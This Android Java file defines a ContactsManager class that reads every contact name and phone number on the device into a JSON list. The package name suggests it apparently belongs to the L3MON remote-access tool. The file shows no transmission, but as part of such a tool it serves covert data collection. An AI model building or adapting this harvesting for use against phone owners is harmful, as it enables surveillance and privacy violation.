package com.etechd.l3mon.features.contacts;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsManager {

    private static final String TAG = "ContactsManager";

    public static JSONObject getContacts() {
        JSONObject contacts = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            Context context = L3monApp.getContext();
            try (Cursor cur = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {

                if (cur != null) {
                    while (cur.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        int nameIdx = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                        int numIdx = cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        if (numIdx != -1) contact.put("phoneNo", cur.getString(numIdx));
                        if (nameIdx != -1) contact.put("name", cur.getString(nameIdx));
                        list.put(contact);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Contacts error", e);
        }

        try {
            contacts.put("contactsList", list);
        } catch (JSONException e) {
            Log.e(TAG, "Contacts list JSON error", e);
        }
        return contacts;
    }
}
